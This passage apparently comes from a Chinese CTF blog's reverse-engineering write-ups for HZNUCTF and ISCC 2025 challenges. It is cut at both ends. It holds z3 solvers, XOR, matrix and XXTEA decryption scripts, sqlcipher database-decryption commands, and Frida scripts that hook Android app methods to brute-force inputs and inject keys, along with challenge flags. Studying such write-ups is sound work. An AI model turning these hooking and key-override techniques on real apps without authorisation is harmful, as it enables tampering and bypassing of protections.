* i11i1Iii1I1[6] - 6 * i11i1Iii1I1[7] - 6 * i11i1Iii1I1[8] - 21 * i11i1Iii1I1[9]) + 9 * i11i1Iii1I1[10] - 6 * i11i1Iii1I1[11] - 12 * i11i1Iii1I1[12]) + 69 * i11i1Iii1I1[13] - 2 * i11i1Iii1I1[14] - 406 * i11i1Iii1I1[15]) + 651 * i11i1Iii1I1[16] + 2 * i11i1Iii1I1[17] - 10 * i11i1Iii1I1[18]) + 69 * i11i1Iii1I1[19] - 0 * i11i1Iii1I1[20]) + 21 * i11i1Iii1I1[21] == 18768,    (((((555 * i11i1Iii1I1[0] - 6666 * i11i1Iii1I1[1]) + 70 * i11i1Iii1I1[2] + 510 * i11i1Iii1I1[3] - 90 * i11i1Iii1I1[4]) + 499 * i11i1Iii1I1[5] + 66 * i11i1Iii1I1[6] - 66 * i11i1Iii1I1[7] - 610 * i11i1Iii1I1[8] - 221 * i11i1Iii1I1[9]) + 9 * i11i1Iii1I1[10] - 23 * i11i1Iii1I1[11] - 102 * i11i1Iii1I1[12]) + 6 * i11i1Iii1I1[13] + 2050 * i11i1Iii1I1[14] - 406 * i11i1Iii1I1[15]) + 665 * i11i1Iii1I1[16] + 333 * i11i1Iii1I1[17] + 100 * i11i1Iii1I1[18] + 609 * i11i1Iii1I1[19] + 777 * i11i1Iii1I1[20] + 201 * i11i1Iii1I1[21] - 22 * i11i1Iii1I1[22] == 111844,    (((((((1 * i11i1Iii1I1[0] - 22 * i11i1Iii1I1[1]) + 333 * i11i1Iii1I1[2] + 4444 * i11i1Iii1I1[3] - 5555 * i11i1Iii1I1[4]) + 6666 * i11i1Iii1I1[5] - 666 * i11i1Iii1I1[6]) + 676 * i11i1Iii1I1[7] - 660 * i11i1Iii1I1[8] - 22 * i11i1Iii1I1[9]) + 9 * i11i1Iii1I1[10] - 73 * i11i1Iii1I1[11] - 107 * i11i1Iii1I1[12]) + 6 * i11i1Iii1I1[13] + 250 * i11i1Iii1I1[14] - 6 * i11i1Iii1I1[15]) + 65 * i11i1Iii1I1[16] + 39 * i11i1Iii1I1[17] + 10 * i11i1Iii1I1[18] + 69 * i11i1Iii1I1[19] + 777 * i11i1Iii1I1[20] + 201 * i11i1Iii1I1[21] - 2 * i11i1Iii1I1[22]) + 23 * i11i1Iii1I1[23] == 159029,    (((520 * i11i1Iii1I1[0] - 222 * i11i1Iii1I1[1]) + 333 * i11i1Iii1I1[2] + 4 * i11i1Iii1I1[3] - 56655 * i11i1Iii1I1[4]) + 6666 * i11i1Iii1I1[5] + 666 * i11i1Iii1I1[6] + 66 * i11i1Iii1I1[7] - 60 * i11i1Iii1I1[8] - 220 * i11i1Iii1I1[9]) + 99 * i11i1Iii1I1[10] + 73 * i11i1Iii1I1[11] + 1007 * i11i1Iii1I1[12] + 7777 * i11i1Iii1I1[13] + 2500 * i11i1Iii1I1[14] + 6666 * i11i1Iii1I1[15] + 605 * i11i1Iii1I1[16] + 390 * i11i1Iii1I1[17] + 100 * i11i1Iii1I1[18] + 609 * i11i1Iii1I1[19] + 99999 * i11i1Iii1I1[20] + 210 * i11i1Iii1I1[21] + 232 * i11i1Iii1I1[22] + 23 * i11i1Iii1I1[23] - 24 * i11i1Iii1I1[24] == 2762025,    ((((1323 * i11i1Iii1I1[0] - 22 * i11i1Iii1I1[1]) + 333 * i11i1Iii1I1[2] + 4 * i11i1Iii1I1[3] - 55 * i11i1Iii1I1[4]) + 666 * i11i1Iii1I1[5] + 666 * i11i1Iii1I1[6] + 66 * i11i1Iii1I1[7] - 660 * i11i1Iii1I1[8] - 220 * i11i1Iii1I1[9]) + 99 * i11i1Iii1I1[10] + 3 * i11i1Iii1I1[11] + 100 * i11i1Iii1I1[12] + 777 * i11i1Iii1I1[13] + 2500 * i11i1Iii1I1[14] + 6666 * i11i1Iii1I1[15] + 605 * i11i1Iii1I1[16] + 390 * i11i1Iii1I1[17] + 100 * i11i1Iii1I1[18] + 609 * i11i1Iii1I1[19] + 9999 * i11i1Iii1I1[20] + 210 * i11i1Iii1I1[21] + 232 * i11i1Iii1I1[22] + 23 * i11i1Iii1I1[23] - 24 * i11i1Iii1I1[24]) + 25 * i11i1Iii1I1[25] == 1551621,    (((((777 * i11i1Iii1I1[0] - 22 * i11i1Iii1I1[1]) + 6969 * i11i1Iii1I1[2] + 4 * i11i1Iii1I1[3] - 55 * i11i1Iii1I1[4]) + 666 * i11i1Iii1I1[5] - 6 * i11i1Iii1I1[6]) + 96 * i11i1Iii1I1[7] - 60 * i11i1Iii1I1[8] - 220 * i11i1Iii1I1[9]) + 99 * i11i1Iii1I1[10] + 3 * i11i1Iii1I1[11] + 100 * i11i1Iii1I1[12] + 777 * i11i1Iii1I1[13] + 250 * i11i1Iii1I1[14] + 666 * i11i1Iii1I1[15] + 65 * i11i1Iii1I1[16] + 90 * i11i1Iii1I1[17] + 100 * i11i1Iii1I1[18] + 609 * i11i1Iii1I1[19] + 999 * i11i1Iii1I1[20] + 21 * i11i1Iii1I1[21] + 232 * i11i1Iii1I1[22] + 23 * i11i1Iii1I1[23] - 24 * i11i1Iii1I1[24]) + 25 * i11i1Iii1I1[25] - 26 * i11i1Iii1I1[26] == 948348,    ((((((97 * i11i1Iii1I1[0] - 22 * i11i1Iii1I1[1]) + 6969 * i11i1Iii1I1[2] + 4 * i11i1Iii1I1[3] - 56 * i11i1Iii1I1[4]) + 96 * i11i1Iii1I1[5] - 6 * i11i1Iii1I1[6]) + 96 * i11i1Iii1I1[7] - 60 * i11i1Iii1I1[8] - 20 * i11i1Iii1I1[9]) + 99 * i11i1Iii1I1[10] + 3 * i11i1Iii1I1[11] + 10 * i11i1Iii1I1[12] + 707 * i11i1Iii1I1[13] + 250 * i11i1Iii1I1[14] + 666 * i11i1Iii1I1[15] + -9 * i11i1Iii1I1[16] + 90 * i11i1Iii1I1[17] + -2 * i11i1Iii1I1[18] + 609 * i11i1Iii1I1[19] + 0 * i11i1Iii1I1[20] + 21 * i11i1Iii1I1[21] + 2 * i11i1Iii1I1[22] + 23 * i11i1Iii1I1[23] - 24 * i11i1Iii1I1[24]) + 25 * i11i1Iii1I1[25] - 26 * i11i1Iii1I1[26]) + 27 * i11i1Iii1I1[27] == 777044,    (((((177 * i11i1Iii1I1[0] - 22 * i11i1Iii1I1[1]) + 699 * i11i1Iii1I1[2] + 64 * i11i1Iii1I1[3] - 56 * i11i1Iii1I1[4] - 96 * i11i1Iii1I1[5] - 66 * i11i1Iii1I1[6]) + 96 * i11i1Iii1I1[7] - 60 * i11i1Iii1I1[8] - 20 * i11i1Iii1I1[9]) + 99 * i11i1Iii1I1[10] + 3 * i11i1Iii1I1[11] + 10 * i11i1Iii1I1[12] + 707 * i11i1Iii1I1[13] + 250 * i11i1Iii1I1[14] + 666 * i11i1Iii1I1[15] + -9 * i11i1Iii1I1[16] + 0 * i11i1Iii1I1[17] + -2 * i11i1Iii1I1[18] + 69 * i11i1Iii1I1[19] + 0 * i11i1Iii1I1[20] + 21 * i11i1Iii1I1[21] + 222 * i11i1Iii1I1[22] + 23 * i11i1Iii1I1[23] - 224 * i11i1Iii1I1[24]) + 25 * i11i1Iii1I1[25] - 26 * i11i1Iii1I1[26]) + 27 * i11i1Iii1I1[27] - 28 * i11i1Iii1I1[28] == 185016,    ((((((77 * i11i1Iii1I1[0] - 2 * i11i1Iii1I1[1]) + 6 * i11i1Iii1I1[2] + 6 * i11i1Iii1I1[3] - 96 * i11i1Iii1I1[4] - 9 * i11i1Iii1I1[5] - 6 * i11i1Iii1I1[6]) + 96 * i11i1Iii1I1[7] - 0 * i11i1Iii1I1[8] - 20 * i11i1Iii1I1[9]) + 99 * i11i1Iii1I1[10] + 3 * i11i1Iii1I1[11] + 10 * i11i1Iii1I1[12] + 707 * i11i1Iii1I1[13] + 250 * i11i1Iii1I1[14] + 666 * i11i1Iii1I1[15] + -9 * i11i1Iii1I1[16] + 0 * i11i1Iii1I1[17] + -2 * i11i1Iii1I1[18] + 9 * i11i1Iii1I1[19] + 0 * i11i1Iii1I1[20] + 21 * i11i1Iii1I1[21] + 222 * i11i1Iii1I1[22] + 23 * i11i1Iii1I1[23] - 224 * i11i1Iii1I1[24]) + 26 * i11i1Iii1I1[25] - -58 * i11i1Iii1I1[26]) + 27 * i11i1Iii1I1[27] - 2 * i11i1Iii1I1[28]) + 29 * i11i1Iii1I1[29] == 130106]for i in ii1iIi1i11i:    s.add(i)res =&quot;&quot;if s.check() == sat:    for i in range(30):        res += chr(s.model()[i11i1Iii1I1[i]].as_long())print(res)tab = dict()for i in range(0,len(res),2):    if res[i+1] == &#x27;1&#x27;: continue    tab[res[i+1]] = res[i]print(tab)m = &quot;111111116257645365477364777645752361&quot;flag = &quot;HZNUCTF&#123;&quot;for i in m:    if i == &#x27;1&#x27;: continue    flag += tab[i]flag+=&#x27;&#125;&#x27;print(flag)HZNUCTF&#123;ad7fa-76a7-ff6a-fffa-7f7d6a&#125;\n\n水果忍者 AES加密\n![image (3)](https://huanghunr-blog.oss-cn-hangzhou.aliyuncs.com/img/image (3).png)\n![image (4)](https://huanghunr-blog.oss-cn-hangzhou.aliyuncs.com/img/image (4).png)\n![image (5)](https://huanghunr-blog.oss-cn-hangzhou.aliyuncs.com/img/image (5).png)\nrandomsystem矩阵操作，换位，乘法，生成密钥，异或加密\nimport reimport numpy as npdef gettaable_byasm():    asm =   &quot;&quot;&quot;    mov     [ebp+var_104], 1mov     [ebp+var_100], 1mov     [ebp+var_FC], 0mov     [ebp+var_F8], 1mov     [ebp+var_F4], 0mov     [ebp+var_F0], 0mov     [ebp+var_EC], 1mov     [ebp+var_E8], 0mov     [ebp+var_E4], 0mov     [ebp+var_E0], 1mov     [ebp+var_DC], 1mov     [ebp+var_D8], 0mov     [ebp+var_D4], 0mov     [ebp+var_D0], 1mov     [ebp+var_CC], 0mov     [ebp+var_C8], 1mov     [ebp+var_C4], 0mov     [ebp+var_C0], 0mov     [ebp+var_BC], 1mov     [ebp+var_B8], 1mov     [ebp+var_B4], 0mov     [ebp+var_B0], 1mov     [ebp+var_AC], 1mov     [ebp+var_A8], 0mov     [ebp+var_A4], 0mov     [ebp+var_A0], 0mov     [ebp+var_9C], 0mov     [ebp+var_98], 1mov     [ebp+var_94], 0mov     [ebp+var_90], 1mov     [ebp+var_8C], 0mov     [ebp+var_88], 1mov     [ebp+var_84], 0mov     [ebp+var_80], 1mov     [ebp+var_7C], 0mov     [ebp+var_78], 0mov     [ebp+var_74], 1mov     [ebp+var_70], 0mov     [ebp+var_6C], 1mov     [ebp+var_68], 0mov     [ebp+var_64], 0mov     [ebp+var_60], 0mov     [ebp+var_5C], 0mov     [ebp+var_58], 0mov     [ebp+var_54], 0mov     [ebp+var_50], 1mov     [ebp+var_4C], 0mov     [ebp+var_48], 1mov     [ebp+var_44], 0mov     [ebp+var_40], 0mov     [ebp+var_3C], 0mov     [ebp+var_38], 0mov     [ebp+var_34], 0mov     [ebp+var_30], 0mov     [ebp+var_2C], 1mov     [ebp+var_28], 1mov     [ebp+var_24], 0mov     [ebp+var_20], 1mov     [ebp+var_1C], 1mov     [ebp+var_18], 0mov     [ebp+var_14], 0mov     [ebp+var_10], 0mov     [ebp+var_C], 0mov     [ebp+var_8], 1            &quot;&quot;&quot;    values = re.findall(r&quot;mov.*?,\\s*(\\d+)&quot;, asm)    values = [int(x) for x in values]    return valuesdef exchange(input, tableM):    inlen = len(input)    for i in range(32):        input[i], input[inlen - tableM[i] - 1] = input[inlen - tableM[i] - 1], input[i] #前32位与后32按盒位交换    return inputdef deexchange(input, tableM):    inlen = len(input)    for i in range(32):        input[inlen - tableM[i] - 1], input[i] = input[i], input[inlen - tableM[i] - 1] #前32位与后32按盒位交换    return inputdef changeKey(key):    data = []    for i in range(0, len(key), 2):        data.append((((key[i] - 48)&lt;&lt;4) | (key[i + 1] - 48)) &amp;0xff)    return datakey2 = [53, 50, 54, 53, 53, 54, 54, 53, 53, 50, 54, 53, 53, 51, 54, 53]mm = [376, 356, 169, 501, 277, 329, 139, 342, 380, 365, 162, 258, 381, 339, 347, 307, 263, 359, 162, 484, 310, 333, 346,      339, 150, 194, 175, 344, 158, 250, 128, 175, 158, 173, 152, 379, 158, 292, 130, 365, 197, 20, 197, 161, 198, 10,      207, 244, 202, 14, 204, 176, 193, 255, 35, 7, 158, 181, 145, 353, 153, 357, 246, 151]randi = [27, 26, 25, 23, 28, 1, 6, 10, 20, 7, 15, 14, 31, 18, 19, 21, 9, 30, 22, 24, 8, 2, 29, 3, 12, 11, 17, 16, 0, 13, 5, 4] #用c语言生成随机数MatrixB = gettaable_byasm()key = changeKey(key2)for i in range(len(mm)):    mm[i] ^= key[i % len(key)]B = np.array(mm).reshape(-1,8)A = np.array(MatrixB).reshape(-1,8) #转为矩阵-1为自适应invA = np.linalg.inv(A) #求逆res = invA @ B #矩阵乘法resl =deexchange(res.astype(int).flatten().tolist(),randi) #flatten降维，转成list,astype转为int类型flag =&#x27;&#x27;.join(map(chr,resl))print(flag)\n\n","categories":["WriteUp"],"tags":["re,WriteUp"]},{"title":"2025ISCC 复现","url":"/2025/05/21/ISCC-re/","content":"School三进制战争第一段就不说了，第二段两个字符是12位3进制，按两个字符爆破就行。\nJava.perform(function () &#123;    let res = &quot;&quot;;    Java.scheduleOnMainThread(function () &#123;      try&#123;          const MainActivity = Java.use(&quot;com.example.mobile02.MainActivity&quot;);          const instance = MainActivity.$new();            const target = &quot;011010000102021112011120012212010120&quot;;          const charset = &#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()-_=+[]&#123;&#125;|;:,.&lt;&gt;?/`~&#x27;;          let key = instance.stringFromJN1();          for(let k =0;k&lt;3;k++)&#123;  //两个字节爆破一次，一起6字节              for (let i = 0; i &lt; charset.length; i++) &#123;                  for (let j = 0; j &lt; charset.length; j++) &#123;                      const candidate = charset[i] + charset[j];                      try &#123;                          let result = instance.stringFromJNl(key,res +candidate);  //前面的字节也要带上(res)                          result = result.slice(0,k*12 +12);                          // console.log(candidate + &quot; =&gt; &quot; + result);                          if (result === target.slice(0,k*12 +12)) &#123;                            res+=candidate; //得到爆破结果加到res中                            i = charset.length; //结束循环                            console.log(&quot;[✔] Found match: &quot; + candidate + &quot; =&gt; &quot; + result);                            break;                          &#125;                      &#125; catch (err) &#123;                          console.error(&quot;Error with input:&quot;, candidate, err);                      &#125;                  &#125;              &#125;            &#125;            console.log(&quot;res = &quot; + res);      &#125;      catch(e)&#123;        console.log(e);      &#125;        &#125;);const MainActivity = Java.use(&quot;com.example.mobile02.MainActivity&quot;);MainActivity[&quot;stringFromJNI&quot;].implementation = function (str1) &#123;    console.log(`MainActivity.stringFromJNI is called: str1=$&#123;str1&#125;`);    let result = this[&quot;stringFromJNI&quot;](str1);    console.log(`MainActivity.stringFromJNI result=$&#123;result&#125;`);    console.log(&quot;flag: &quot; + &quot;ISCC&#123;&quot;+ result+ res+ &quot;&#125;&quot;);    return result;&#125;;MainActivity[&quot;CHECK1&quot;].implementation = function (str1) &#123;    console.log(`MainActivity.CHECK1 is called: str1=$&#123;str1&#125;`);    let inp = &quot;ISCC&#123;111111111111111&#125;&quot;    let result = this[&quot;CHECK1&quot;](inp);    // console.log(`MainActivity.CHECK1 result=$&#123;result&#125;`);    return result;&#125;;// MainActivity[&quot;stringFromJNl&quot;].implementation = function (key, input) &#123;//     console.log(`MainActivity.stringFromJNl is called: key=$&#123;key&#125;, input=$&#123;input.slice(3, 9)&#125;`);//     let data = &quot;8edf4116e5bbacd84bbe78bd8bdf99f7&quot;;//     let result = this[&quot;stringFromJNl&quot;](data, input.slice(3, 9));//     console.log(`MainActivity.stringFromJNl result=$&#123;result&#125;`);//     return result;// &#125;;// MainActivity[&quot;CHECK2&quot;].implementation = function (str1) &#123;//     console.log(`MainActivity.CHECK2 is called: str1=$&#123;str1&#125;`);//     let result = this[&quot;CHECK2&quot;](str1);//     console.log(`MainActivity.CHECK2 result=$&#123;result&#125;`);//     return result;// &#125;;// // MainActivity[&quot;stringFromJN1&quot;].implementation = function () &#123;//     console.log(`MainActivity.stringFromJN1 is called`);//     let result = this[&quot;stringFromJN1&quot;]();//     console.log(`MainActivity.stringFromJN1 result=$&#123;result&#125;`);//     return result;// &#125;;&#125;);/*[✔] Found match: A1 =&gt; 011010000102[✔] Found match: b@ =&gt; 011010000102021112011120[✔] Found match: 3c =&gt; 011010000102021112011120012212010120res = A1b@3cMainActivity.CHECK1 is called: str1=1MainActivity.stringFromJNI is called: str1=7kL@22MainActivity.stringFromJNI result=%3G&#x27;bc&#x27;rwflag: ISCC&#123;%3G&#x27;bc&#x27;rwA1b@3c&#125;*/\n\nRegionrefaze格式化字符串把flag解密出来与ISCC头拼接，直接下断点拿到flag\n\nSecretGrid第一关就是一个数独的约束。\n第二关是一个数独游戏，除了满足普通数独的要求外，在结果中还要包含至少五个特定的句子，单词。用z3约束求解。\nfrom z3 import *#将句子字符串转换为句子列表，每个句子是一个单词列表，每个单词是一个字符列表def init_sentences(sentences):    sentences = sentences.split(&#x27;\\n&#x27;)    sentences = [s.split(&quot; &quot;) for s in sentences if s]    sentences = [[list(map(ord,s)) for s in sen] for sen in sentences]    return sentencess = Solver()word = [&#x27;a&#x27;,&#x27;e&#x27;,&#x27;i&#x27;,&#x27;l&#x27;,&#x27;p&#x27;,&#x27;r&#x27;,&#x27;s&#x27;,&#x27;t&#x27;,&#x27;u&#x27;]word_int =[ord(i) for i in word] #将字母转换为整数列表# 创建9宫格变量var = [[Int(f&quot;var_&#123;i&#125;_&#123;j&#125;&quot;) for j in range(9)] for i in range(9)] # 约束 var[r][c] 必须是字母中的一个值for r in range(9):    for c in range(9):        s.add(Or([var[r][c] == val for val in word_int]))# 行列不相等for i in range(9):    s.add(Distinct([var[i][j] for j in range(9)]))    s.add(Distinct([var[j][i] for j in range(9)]))# 3*3内不相等for i in range(3):    for j in range(3):        three = [var[i*3+k][j*3+l] for k in range(3) for l in range(3)]        s.add(Distinct(three))# 条件句子sentences =&quot;&quot;&quot;past is pleasureplease user itrap less piterits pure latteris leetrit platstepall use peatrlepali atar usarsets a pure sereattales sell appets&quot;&quot;&quot;#将句子字符串转换为句子列表，每个句子是一个单词列表，每个单词是一个字符列表sentences = init_sentences(sentences)# 一个单词在特定位往旁边8个方向延伸的方向向量vector = [[-1,-1],[-1,0],[-1,1],  [0,-1],[0,1],  [1,-1],[1,0],[1,1]]# 每个句子在9宫格中满足的路径sentences_paths = []for line_index,line in enumerate(sentences):    # 一个句子中的每个单词在9宫格中满足的路径    line_paths =[]    for word in line:        #一个单词满足的路径        word_paths =[]        word_len = len(word)        # 遍历9宫格中每个格子，以每个格子为开始位置，往8个方向延伸，看是否满足单词        for i in range(9):            for j in range(9):                # 一个单词在一个格子上八个方向满足的路径                for start,end in vector:                    one_path = []                    # 边界检查，延伸的长度不能超出9宫格                    if i+start*word_len &gt;= 0 and i+start*word_len &lt;= 9 and j+end*word_len &gt;= 0 and j+end*word_len &lt;= 9:                        # 其中的一条路径                         for k in range(word_len):                            one_path.append(var[i+start*k][j+end*k] == word[k])                        word_paths.append(And(one_path)) #每个字母组成一个单词，每个字母必须全部出现            line_paths.append(Or(word_paths)) #每个单词至少出现一次    sentences_paths.append(And(line_paths)) #每个句子的单词必须全部出现s.add(Or(sentences_paths)) # 添加每个句子的条件# 判断句子是否出现ifsentence = [Bool(f&quot;if_sentence_&#123;i&#125;&quot;) for i in range(len(sentences_paths))]for i in range(len(sentences_paths)): s.add(Implies(ifsentence[i],sentences_paths[i]))#如果句子出现就为1，否则为0，要满足至少5个句子出现s.add(Sum([If(sen, 1, 0) for sen in ifsentence]) &gt;= 5)#输出结果res = &quot;&quot;if s.check() == sat:    m = s.model()    for i in range(9):        for j in range(9):            res += chr(m[var[i][j]].as_long())else:    print(&quot;No solution found&quot;)print(res)#lrapiuetsieptlsurautsraeliptpiseralueaulptisrslrauitperueislpatpiterasulaslutprei\n\n输入结果后给出了flag：ISCC{s_ale_ru_upatu_prrlaullre_}，但是是错的，提示”True decode is in true_decode 郟搒?”。\n回看输出函数，在decode函数中发现还有一层加密，里面有一堆摩托罗拉字节码和密文，用脚本修一下末尾的校验和。把内容放到input.srec中。\ndata = &quot;&quot;&quot;S123050C9421FFD093E1002C7C3F0B78907F000C909F000839200000913F001E4800012C5BS123052C813F001E552907FE2F890000409E0058813F001E815F000C7D2A4A1489290000DBS123054C7D2A07743D20100281090018813F001E7D284A1489290000392900025529063E60S123056C7D2907747D494A787D280774813F001E815F00087D2A4A14550A063E99490000ADS123058C480000BC815F001E3D205555612955567D0A48967D49FE707D2940501D2900030AS12305AC7D2950502F890000409E0058813F001E815F000C7D2A4A14892900007D2A0774ABS12305CC3D20100281090018813F001E7D284A1489290000392900055529063E7D290774E2S12305EC7D494A787D280774813F001E815F00087D2A4A14550A063E994900004800004094S123060C813F001E815F000C7D2A4A14890900003D20100281490018813F001E7D2A4A14CAS123062C89490000813F001E80FF00087D274A147D0A5278554A063E99490000813F001E82S123064C39290001913F001E813F001E2F89001E409DFED0813F00083929001F39400000E7S11B066C9949000060000000397F003083EBFFFC7D615B784E800020BF&quot;&quot;&quot;def checksum_fix(hex_str):    a =[i for i in bytes.fromhex(hex_str)]    checkvalue = hex(0xff - (sum(a) &amp; 0xFF))[2:].upper()    if len(checkvalue) &lt; 2:        checkvalue = &quot;0&quot;*(2-len(checkvalue)) + checkvalue    return hex_str + checkvaluefor line in data.splitlines():    print(&quot;S1&quot;+checksum_fix(line[2:-2:]))\n\n再用Srecord转成二进制文件。\nsrec_cat.exe input.srec -o output.bin -binary\n\n用ida以powerPC处理器打开output.bin文件。在字节码开始的位置P,F5即可看到伪代码。\n\n逻辑恢复，猜测密钥就是刚刚的假flag（刚好30字节），解密即可。\ndef xor(data:list, key:list) -&gt;list:    res =[]    for i in range(30):        if i &amp; 1:            if i % 3:                res.append(data[i] ^ key[i])            else:                res.append(data[i] ^ (key[i]+5))        else:            res.append(data[i] ^ (key[i]+2))    return resdata =[8, 53, 46, 124, 16, 56, 88, 27, 59, 89, 59, 86, 27, 50, 82, 68, 50, 30, 37, 124, 43, 74, 34, 91, 61, 70, 93, 84, 44, 43, 28]key = [ord(i) for i in &quot;ISCC&#123;s_ale_ru_upatu_prrlaullre_&#125;&quot;]res = xor(data, key)flag = &quot;ISCC&#123;&quot; + &quot;&quot;.join([chr(i) for i in res]) +&quot;&#125;&quot;print(flag)# ISCC&#123;Cfk4mK9zU3Z$lm%1QjR#Y=V7^33%XN&#125;\n\n\n有趣的⼩游戏一个类似吃豆人的游戏，1000分即可通关。逻辑如下。\nmain函数\n\nis_val函数\n\n这里每一步操作和到达C点都对密文进行一次解密。\n在dec里面动态加载了附带的两个二进制文件。动调可以发现是一个xxtea解密函数。里面可以直接拿到密钥。\n相比于标准xxtea解密算法，本题魔改了第二处解密操作的密钥获取索引为(key[e] ^ z)。\n\n主要就是根据路径长度对密文进行xxtea次解密，虽然有dec里有两个xxtea解密函数，但是他们的解密逻辑是相同，只要解密到特定的次数就可以得到flag明文。这里分数最少都是1000，移动的步数最少也是一千步，即至少解密1000次。直接写脚本爆破解密次数即可。\n#include&lt;stdio.h&gt;#include&lt;stdint.h&gt;void dec_btea(uint32_t* v, int n, uint32_t const key[4])&#123;    uint32_t y, z, sum, delta;    unsigned p, rounds, e;    delta = 0x9e3779b9;    rounds = 6 + 52 / n;    sum = rounds * delta;    y = v[0];    do    &#123;        e = (sum &gt;&gt; 2) &amp; 3;        for (p = n - 1; p &gt; 0; p--)            &#123;            z = v[p - 1];            y = v[p] -= (((z &gt;&gt; 5 ^ y &lt;&lt; 2) + (y &gt;&gt; 3 ^ z &lt;&lt; 4)) ^ ((sum ^ y) + (key[(p &amp; 3) ^ e] ^ z)));        &#125;        z = v[n - 1];        y = v[0] -= (((z &gt;&gt; 5 ^ y &lt;&lt; 2) + (y &gt;&gt; 3 ^ z &lt;&lt; 4)) ^ ((sum ^ y) + (key[e] ^ z)));           sum -= delta;    &#125; while (--rounds);&#125;int main()&#123;    uint32_t v[30] = &#123; 0xDF6C144A, 0xED60654A, 0x3E43C8E7, 0x5B05A933, 0x5E0946EF, 0xB873A0C4, 0x5C50EA5A, 0x19F34CBB,    0xAAA28A10, 0x3787B44A, 0x71AC6EB3, 0x5B29F29C, 0xC3AD78DD, 0xB1DE477B, 0x106286A2, 0x4AAFCE01,    0x76C8CDFD, 0x9A643D12, 0x7A5DBDB7, 0x5FB17810, 0xF34E4921, 0x0FC56F93, 0x694991C9, 0x23A99B89,    0xFD8BEB88, 0x2178FCD8, 0x19339C3B, 0x740208FA, 0x4973D277, 0x3BB34AD9&#125;;    uint32_t const k[4] = &#123; 0x12345678, 0x9ABCDEF0, 0xFEDCBA98, 0x76543210 &#125;;\tfor (int i = 0; i &lt; 10000; i++) &#123;\t\tdec_btea(v, 30, k);        if (v[1] &lt; 0xff &amp;&amp; v[1]&gt;0) break;\t&#125;    \tfor (int i = 0; i &lt; 30; i++) &#123;        if (1) &#123;            printf(&quot;%c&quot;, v[i]);        &#125;        \t&#125;&#125;//ISCC&#123;&lt;9O&quot;|[0&amp;s5;,*@7$RI&#125;GOcO4&#125;\n\n\ngreeting通过字符串找到真正的main函数，分析下来核心加密逻辑就只有下面这个，后面就是flag校验，直接写逆向脚本解密即可。\n\n#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;int ROR(uint8_t *data, int n) &#123;\t*data = (*data &gt;&gt; n) | (*data &lt;&lt; (8 - n));\treturn 1;&#125;int main() &#123;\tuint8_t mm[] = &#123; 0x13,0x10,0x7C,0xF0,0x52,0x36,0x5C,0x45,0xCA,0xF0,0x9,0xB2,0xC8,0xE1,0xE4,0x14 &#125;;\tfor (int i = 0; i &lt; 16; i++) &#123;\t\tROR(&amp;mm[i], i%5);\t\tmm[i] ^= i + 90;\t&#125;\tfor (int i = 0; i &lt; 16; i++) &#123;\t\tprintf(&quot;%c&quot;, mm[i]);\t&#125;&#125;//ISCC&#123;iN0;lm&lt;T[&amp;&#125;\n\nmobilemobide1第一个页面直接输入flag会闪退，发现是因为传入blowfish的密钥为空，需要去寻找密钥，题目还附带了一个enflag.db的数据库，但是被加密了。\n题目中有第二个页面，里面创建了数据库，并往数据库里写入了信息，输入名字和等级就可查询到写入的base64字符串，用base64解密foLaG？，提示{flag0.o?keyo.0}ccsl。因为我们只能获取前三个，推测前三个就是数据库密钥，用三层base64即可解密，拼接在一起就是数据库key。\n\n\n在Windows下，用sqlchiper解密数据库\nsqlcipher-shell64.exe enflag.dbPRAGMA key = &#x27;CAELUS&#x27;;ATTACH DATABASE &#x27;plaintext.db&#x27; AS plaintext KEY &#x27;&#x27;;SELECT sqlcipher_export(&#x27;plaintext&#x27;);\n\n解密后可以看到blowfish的key\n\n用frida脚本把key写回去就可以拿到flag。\nJava.perform(function () &#123;    var t = 0    let loop = setInterval(function () &#123;        let b = Java.use(&quot;com.example.mobile01.b&quot;);        let DESHelper = Java.use(&quot;com.example.mobile01.DESHelper&quot;);        b[&quot;c&quot;].implementation = function () &#123;            console.log(`b.c is called`);            return &quot;WxYzAbCdEfGhIjKl&quot;; //写回密钥        &#125;;        t+=1        if (t &gt; 100) clearInterval(loop)        DESHelper.encrypt.implementation = function (str, str2, str3) &#123;            console.log(`DESHelper.encrypt is called: str=$&#123;str&#125;, str2=$&#123;str2&#125;, str3=$&#123;str3&#125;`);            let result = this[&quot;encrypt&quot;](str, str2, str3);            console.log(`DESHelper.encrypt result=$&#123;result&#125;`);            console.log(`FLAG=ISCC&#123;$&#123;result&#125;&#125;`);            return result;        &#125;;    &#125;, 100)&#125;)//FLAG=ISCC&#123;pAK51YtjzLPtTlO2WF16SLnw63oJpCHn&#125;\n\n\nmobile2Detectiveflag先转为16进制，再用b.a进行混淆，然后用a.c按四位16进制转为字符。最后传入native的stringFromJNI()中。\nnative的stringFromJNI()里面只有一个异或加密，密钥是“Sherlock”。\n\n按照函数逻辑逆推回去就行\nkey = [0x53, 0x68, 0x65, 0x72, 0x6C, 0x6F, 0x63, 0x6B]enc = &quot;1027444F3F5742506A3B24535F2C224A&quot;bytes_dec = [int(enc[i:i+2], 16) for i in range(0, len(enc), 2)]#XORrecovered = [(b ^ key[i % len(key)]) for i, b in enumerate(bytes_dec)]raw_str = bytes(recovered).decode()# 每个字符4位转十六进制hex_fragment = &#x27;&#x27;.join(f&#x27;&#123;ord(c):04x&#125;&#x27; for c in raw_str)if hex_fragment.startswith(&quot;00&quot;):    hex_fragment = hex_fragment[2:]# 去除每 2 位后的插入 &#x27;00&#x27;if len(hex_fragment) % 4 == 2:    hex_fragment += &quot;00&quot;res = &#x27;&#x27;.join(hex_fragment[i:i+2] for i in range(0, len(hex_fragment), 4))# b.a()2res1 = []idx = 0while idx &lt; len(res):    if idx + 3 &lt; len(res) and res[idx+2:idx+4] == &quot;21&quot;:        res1.append(res[idx+1])        res1.append(res[idx])        idx += 4    else:        res1.extend(res[idx:idx+2])        idx += 2res2 = &#x27;&#x27;.join(res1)# b.a()1midpoint = len(res2) // 2one_half = res2[:midpoint]two_half = res2[midpoint:]sb = &quot;&quot;for idx in range(len(one_half)):    char = one_half[idx]    if char == &#x27;3&#x27; and (idx == 1 or (idx - 1) % 3 == 0):        sb += &#x27;0&#x27;    else:        sb += charsb2 = &quot;&quot;for idx in range(len(two_half)):    char = two_half[idx]    if char == &#x27;3&#x27; and (idx == 0 or idx % 3 == 0):        sb2 += &#x27;0&#x27;    else:        sb2 += charinterleaved = []i = j = 0for k in range(len(res2)):    if k % 2 == 0:        interleaved.append(sb2[i])        i += 1    else:        interleaved.append(sb[j])        j += 1final_hex = 